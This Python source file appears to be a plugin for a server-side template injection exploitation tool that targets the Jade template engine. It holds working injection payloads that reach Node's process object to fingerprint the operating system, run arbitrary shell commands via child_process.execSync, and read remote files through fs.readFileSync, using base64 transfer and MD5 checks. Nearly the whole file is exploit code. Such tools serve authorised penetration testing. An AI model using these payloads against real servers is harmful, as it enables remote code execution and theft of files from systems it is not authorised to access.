from core.check import Check
from utils.loggers import log
from utils import rand
from utils.strings import quote, base64decode, md5
import string

class Jade(Check):

    render_tag = '\n= %(payload)s\n'
    header_tag = '\n= %(header)s\n'
    trailer_tag = '\n= %(trailer)s\n'
    contexts = [ ]

    def detect_engine(self):
        
        execution_code = """- var x = global.process
- x = x.mainModule.require
- x = x('os')
= x.platform()
"""
        self.set('os', self.inject(execution_code))
        self.set('language', 'javascript')
        self.set('eval', 'javascript')
        self.set('engine', 'jade')
        
    def detect_exec(self):

        expected_rand = str(rand.randint_n(2))

        if expected_rand == self.execute('echo %s' % expected_rand):
            self.set('exec', True)

    def execute(self, command):

        execution_code = """- var x = global.process
- x = x.mainModule.require
- x = x('child_process')
= x.execSync("%s")
""" % quote(command)

        return self.inject(execution_code)
        
    def detect_read(self):
        self.set('read', True)
        
    def read(self, remote_path):
        
        # Get remote file md5
        md5_remote = self._md5(remote_path)
            
        if not md5_remote:
            log.warn('Error getting remote file md5, check presence and permission')
            return
        
        # Using base64 since self.execute() calling self.inject() strips
        # the response, corrupting the data
        data_b64encoded = self.inject("""- var x = global.process
- x = x.mainModule.require
- y = x('fs')
- z = x('crypto')
= y.readFileSync('%s').toString('base64')
""" % remote_path)

        data = base64decode(data_b64encoded)
        
        if not md5(data) == md5_remote:
            log.warn('Remote file md5 mismatch, check manually')
        else:
            log.info('File downloaded correctly')
            
        return data

    def _md5(self, remote_path):
        
        execution_code = """- var x = global.process
- x = x.mainModule.require
- y = x('fs')
- z = x('crypto')
- y = y.readFileSync('%s').toString()
= z.createHash('md5').update(y).digest("hex")
""" % remote_path

        return self.inject(execution_code)